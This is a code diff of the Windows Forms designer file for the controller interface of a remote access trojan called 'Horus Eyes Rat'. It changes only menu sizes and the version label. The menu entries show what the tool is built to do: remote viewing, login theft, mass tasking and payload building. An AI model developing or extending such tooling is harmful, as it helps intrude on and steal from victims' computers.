@@ -90,7 +90,7 @@ Partial Class Dark
         Me.ContextMenuStrip1.ImageScalingSize = New System.Drawing.Size(28, 28)
         Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RDToolStripMenuItem, Me.LoginToolStripMenuItem, Me.MassTasksToolStripMenuItem, Me.ClientToolStripMenuItem, Me.SettingsToolStripMenuItem, Me.BuilderToolStripMenuItem})
         Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
-        Me.ContextMenuStrip1.Size = New System.Drawing.Size(193, 230)
+        Me.ContextMenuStrip1.Size = New System.Drawing.Size(166, 208)
         '
         'RDToolStripMenuItem
         '
@@ -98,7 +98,7 @@ Partial Class Dark
         Me.RDToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.RDToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_monitor_32
         Me.RDToolStripMenuItem.Name = "RDToolStripMenuItem"
-        Me.RDToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.RDToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.RDToolStripMenuItem.Text = "Remote Viewer"
         '
         'LoginToolStripMenuItem
@@ -107,7 +107,7 @@ Partial Class Dark
         Me.LoginToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.LoginToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_database_32
         Me.LoginToolStripMenuItem.Name = "LoginToolStripMenuItem"
-        Me.LoginToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.LoginToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.LoginToolStripMenuItem.Text = "Login"
         '
         'MassTasksToolStripMenuItem
@@ -116,7 +116,7 @@ Partial Class Dark
         Me.MassTasksToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.MassTasksToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_gpsd_signal_32
         Me.MassTasksToolStripMenuItem.Name = "MassTasksToolStripMenuItem"
-        Me.MassTasksToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.MassTasksToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.MassTasksToolStripMenuItem.Text = "Mass Tasks"
         '
         'ClientToolStripMenuItem
@@ -126,7 +126,7 @@ Partial Class Dark
         Me.ClientToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.ClientToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_customer_321
         Me.ClientToolStripMenuItem.Name = "ClientToolStripMenuItem"
-        Me.ClientToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.ClientToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.ClientToolStripMenuItem.Text = "Client"
         '
         'CloseToolStripMenuItem
@@ -135,7 +135,7 @@ Partial Class Dark
         Me.CloseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.CloseToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_delete_96
         Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
-        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(158, 22)
         Me.CloseToolStripMenuItem.Text = "Close"
         '
         'CloseUninstallToolStripMenuItem
@@ -143,7 +143,7 @@ Partial Class Dark
         Me.CloseUninstallToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
         Me.CloseUninstallToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.CloseUninstallToolStripMenuItem.Name = "CloseUninstallToolStripMenuItem"
-        Me.CloseUninstallToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.CloseUninstallToolStripMenuItem.Size = New System.Drawing.Size(158, 22)
         Me.CloseUninstallToolStripMenuItem.Text = "Close | Uninstall"
         '
         'SettingsToolStripMenuItem
@@ -152,7 +152,7 @@ Partial Class Dark
         Me.SettingsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.SettingsToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_gears_32
         Me.SettingsToolStripMenuItem.Name = "SettingsToolStripMenuItem"
-        Me.SettingsToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.SettingsToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.SettingsToolStripMenuItem.Text = "Settings"
         '
         'BuilderToolStripMenuItem
@@ -161,7 +161,7 @@ Partial Class Dark
         Me.BuilderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.BuilderToolStripMenuItem.Image = Global.Server.My.Resources.Resources.icons8_toolbox_32
         Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
-        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(192, 34)
+        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(165, 34)
         Me.BuilderToolStripMenuItem.Text = "Builder"
         '
         'Label1
@@ -169,9 +169,9 @@ Partial Class Dark
         Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.Label1.Location = New System.Drawing.Point(38, 2)
         Me.Label1.Name = "Label1"
-        Me.Label1.Size = New System.Drawing.Size(81, 32)
+        Me.Label1.Size = New System.Drawing.Size(179, 32)
         Me.Label1.TabIndex = 5
-        Me.Label1.Text = "Horus Eyes Rat"
+        Me.Label1.Text = "Horus Eyes Rat V0.2.1.0"
         Me.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft
         '
         'PictureBox1
